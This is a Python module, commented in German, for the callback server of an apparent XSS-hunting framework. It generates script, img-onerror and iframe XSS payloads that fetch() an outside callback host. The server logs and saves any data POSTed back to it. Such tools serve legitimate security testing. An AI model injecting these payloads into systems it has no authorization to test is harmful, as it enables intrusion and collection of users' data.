#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
XSS Hunter Pro Framework - Callback Server
=========================================

Dieses Modul implementiert einen Callback-Server für die Erkennung von DOM-basierten XSS-Schwachstellen.

Autor: Anonymous
Lizenz: MIT
Version: 0.3.2
"""

import http.server
import json
import logging
import os
import socketserver
import threading
import time
import urllib.parse
import random
import string
from typing import Dict, List, Any, Optional, Tuple, Set

# Konfiguration für Logging
logger = logging.getLogger("XSSHunterPro.CallbackServer")

# Versuche, das Utils-Modul zu importieren
try:
    import utils
    logger.info("Utils-Modul erfolgreich importiert")
except ImportError:
    logger.warning("Utils-Modul konnte nicht importiert werden. Verwende einfache Implementierungen.")
    
    # Einfache Implementierungen für fehlende Funktionen
    def generate_random_string(length=10):
        """Generiert einen zufälligen String."""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def save_json_file(file_path, data):
        """Speichert ein Dictionary als JSON-Datei."""
        try:
            with open(file_path, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            return True
        except Exception as e:
            logger.error(f"Fehler beim Speichern der JSON-Datei {file_path}: {e}")
            return False
    
    # Füge die Funktionen zum utils-Namespace hinzu
    class Utils:
        pass
    
    utils = Utils()
    utils.generate_random_string = generate_random_string
    utils.save_json_file = save_json_file


class CallbackServer:
    """Ein HTTP-Server für Callbacks von XSS-Payloads."""

    def __init__(self, host: str = "0.0.0.0", port: int = 8088, config: Dict[str, Any] = None):
        """
        Initialisiert den Callback-Server.

        Args:
            host: Der Host, auf dem der Server läuft.
            port: Der Port, auf dem der Server läuft.
            config: Ein Dictionary mit Konfigurationsoptionen.
        """
        self.host = host
        self.port = port
        self.config = config or {}
        self.server = None
        self.server_thread = None
        self.callbacks = {}
        self.callback_data = {}
        self.results_dir = self.config.get("results_dir", os.path.join(os.getcwd(), "results"))
        
        # Erstelle das Ergebnisverzeichnis, falls es nicht existiert
        os.makedirs(self.results_dir, exist_ok=True)
        
        logger.info(f"Callback-Server initialisiert (Host: {host}, Port: {port})")

    def start(self):
        """Startet den Callback-Server."""
        if self.is_running():
            logger.warning("Callback-Server läuft bereits")
            return
        
        class CallbackHandler(http.server.BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                # Unterdrücke Logging-Nachrichten
                pass
            
            def do_GET(self):
                try:
                    # Parse den Pfad
                    path = self.path
                    
                    # Callback-Format: /c/<token>
                    if path.startswith("/c/"):
                        token = path[3:]
                        
                        # Registriere den Callback
                        self.server.callback_server.callbacks[token] = time.time()
                        
                        # Sende eine Antwort
                        self.send_response(200)
                        self.send_header("Content-type", "text/html")
                        self.send_header("Access-Control-Allow-Origin", "*")
                        self.end_headers()
                        self.wfile.write(b"<html><body><h1>Callback received</h1></body></html>")
                        
                        logger.info(f"Callback empfangen für Token: {token}")
                        
                        # Speichere den Callback
                        self.server.callback_server._save_callback(token)
                    else:
                        # Sende eine 404-Antwort
                        self.send_response(404)
                        self.send_header("Content-type", "text/html")
                        self.end_headers()
                        self.wfile.write(b"<html><body><h1>404 Not Found</h1></body></html>")
                except Exception as e:
                    logger.error(f"Fehler bei der Verarbeitung der GET-Anfrage: {e}")
                    self.send_response(500)
                    self.send_header("Content-type", "text/html")
                    self.end_headers()
                    self.wfile.write(b"<html><body><h1>500 Internal Server Error</h1></body></html>")
            
            def do_POST(self):
                try:
                    # Parse den Pfad
                    path = self.path
                    
                    # Callback-Format: /c/<token>
                    if path.startswith("/c/"):
                        token = path[3:]
                        
                        # Lese die Daten
                        content_length = int(self.headers.get("Content-Length", 0))
                        post_data = self.rfile.read(content_length).decode("utf-8")
                        
                        try:
                            # Versuche, die Daten als JSON zu parsen
                            data = json.loads(post_data)
                        except json.JSONDecodeError:
                            # Wenn das Parsen fehlschlägt, verwende die Rohdaten
                            data = {"raw": post_data}
                        
                        # Registriere den Callback und die Daten
                        self.server.callback_server.callbacks[token] = time.time()
                        self.server.callback_server.callback_data[token] = data
                        
                        # Sende eine Antwort
                        self.send_response(200)
                        self.send_header("Content-type", "text/html")
                        self.send_header("Access-Control-Allow-Origin", "*")
                        self.end_headers()
                        self.wfile.write(b"<html><body><h1>Callback received</h1></body></html>")
                        
                        logger.info(f"Callback mit Daten empfangen für Token: {token}")
                        
                        # Speichere den Callback
                        self.server.callback_server._save_callback(token, data)
                    else:
                        # Sende eine 404-Antwort
                        self.send_response(404)
                        self.send_header("Content-type", "text/html")
                        self.end_headers()
                        self.wfile.write(b"<html><body><h1>404 Not Found</h1></body></html>")
                except Exception as e:
                    logger.error(f"Fehler bei der Verarbeitung der POST-Anfrage: {e}")
                    self.send_response(500)
                    self.send_header("Content-type", "text/html")
                    self.end_headers()
                    self.wfile.write(b"<html><body><h1>500 Internal Server Error</h1></body></html>")
            
            def do_OPTIONS(self):
                """Behandelt CORS-Preflight-Anfragen."""
                self.send_response(200)
                self.send_header("Access-Control-Allow-Origin", "*")
                self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
                self.send_header("Access-Control-Allow-Headers", "Content-Type")
                self.end_headers()
        
        try:
            # Erstelle den Server
            self.server = socketserver.ThreadingTCPServer((self.host, self.port), CallbackHandler)
            self.server.callback_server = self
            
            # Starte den Server in einem separaten Thread
            self.server_thread = threading.Thread(target=self.server.serve_forever)
            self.server_thread.daemon = True
            self.server_thread.start()
            
            logger.info(f"Callback-Server gestartet auf {self.host}:{self.port}")
            return True
        except Exception as e:
            logger.error(f"Fehler beim Starten des Callback-Servers: {e}")
            self.server = None
            self.server_thread = None
            return False

    def stop(self):
        """Stoppt den Callback-Server."""
        if not self.is_running():
            logger.warning("Callback-Server läuft nicht")
            return False
        
        try:
            # Stoppe den Server
            self.server.shutdown()
            self.server.server_close()
            self.server_thread.join()
            
            self.server = None
            self.server_thread = None
            
            logger.info("Callback-Server gestoppt")
            return True
        except Exception as e:
            logger.error(f"Fehler beim Stoppen des Callback-Servers: {e}")
            return False

    def is_running(self) -> bool:
        """
        Überprüft, ob der Callback-Server läuft.

        Returns:
            True, wenn der Server läuft, sonst False.
        """
        return self.server is not None and self.server_thread is not None and self.server_thread.is_alive()

    def clear(self):
        """Löscht alle Callbacks und Daten."""
        self.callbacks = {}
        self.callback_data = {}
        
        logger.info("Callback-Daten gelöscht")

    def get_callback_url(self, token: str = None) -> str:
        """
        Gibt die Callback-URL für ein Token zurück.

        Args:
            token: Das Token für den Callback. Wenn None, wird ein zufälliges Token generiert.

        Returns:
            Die Callback-URL.
        """
        if token is None:
            if hasattr(utils, "generate_random_string"):
                token = utils.generate_random_string(16)
            else:
                token = generate_random_string(16)
        
        return f"http://{self.host}:{self.port}/c/{token}"

    def wait_for_callback(self, token: str, timeout: int = 30) -> Tuple[bool, Optional[Dict[str, Any]]]:
        """
        Wartet auf einen Callback für ein bestimmtes Token.

        Args:
            token: Das Token, auf das gewartet werden soll.
            timeout: Die maximale Wartezeit in Sekunden.

        Returns:
            Ein Tuple mit einem Boolean, der angibt, ob der Callback empfangen wurde,
            und einem Dictionary mit den Callback-Daten.
        """
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            if token in self.callbacks:
                data = self.callback_data.get(token)
                return True, data
            
            time.sleep(0.1)
        
        return False, None

    def _save_callback(self, token: str, data: Dict[str, Any] = None):
        """
        Speichert einen Callback in einer Datei.

        Args:
            token: Das Token des Callbacks.
            data: Die Callback-Daten.
        """
        try:
            # Erstelle die Callback-Daten
            callback_data = {
                "token": token,
                "timestamp": time.time(),
                "data": data or {}
            }
            
            # Speichere die Daten in einer Datei
            file_path = os.path.join(self.results_dir, f"callback_{token}_{int(time.time())}.json")
            
            if hasattr(utils, "save_json_file"):
                utils.save_json_file(file_path, callback_data)
            else:
                save_json_file(file_path, callback_data)
            
            logger.info(f"Callback gespeichert: {file_path}")
        except Exception as e:
            logger.error(f"Fehler beim Speichern des Callbacks: {e}")

    def generate_payload(self, token: str = None, payload_type: str = "script") -> str:
        """
        Generiert einen XSS-Payload mit Callback.

        Args:
            token: Das Token für den Callback. Wenn None, wird ein zufälliges Token generiert.
            payload_type: Der Typ des Payloads (script, img, iframe, etc.).

        Returns:
            Der generierte Payload.
        """
        if token is None:
            if hasattr(utils, "generate_random_string"):
                token = utils.generate_random_string(16)
            else:
                token = generate_random_string(16)
        
        callback_url = self.get_callback_url(token)
        
        if payload_type == "script":
            return f'<script>fetch("{callback_url}");</script>'
        elif payload_type == "img":
            return f'<img src="x" onerror="fetch(\'{callback_url}\');">'
        elif payload_type == "iframe":
            return f'<iframe src="{callback_url}"></iframe>'
        else:
            return f'<script>fetch("{callback_url}");</script>'


# Wenn dieses Skript direkt ausgeführt wird
if __name__ == "__main__":
    # Konfiguriere Logging
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S"
    )
    
    # Teste den Callback-Server
    server = CallbackServer()
    
    if server.start():
        print(f"Callback-Server gestartet auf {server.host}:{server.port}")
        
        # Generiere einen Payload
        token = "test_token"
        payload = server.generate_payload(token)
        print(f"Generierter Payload: {payload}")
        
        # Warte auf einen Callback
        print(f"Warte auf Callback für Token: {token}")
        print(f"Callback-URL: {server.get_callback_url(token)}")
        
        success, data = server.wait_for_callback(token, timeout=60)
        
        if success:
            print(f"Callback empfangen: {data}")
        else:
            print("Kein Callback empfangen")
        
        # Stoppe den Server
        server.stop()
        print("Callback-Server gestoppt")
    else:
        print("Fehler beim Starten des Callback-Servers")
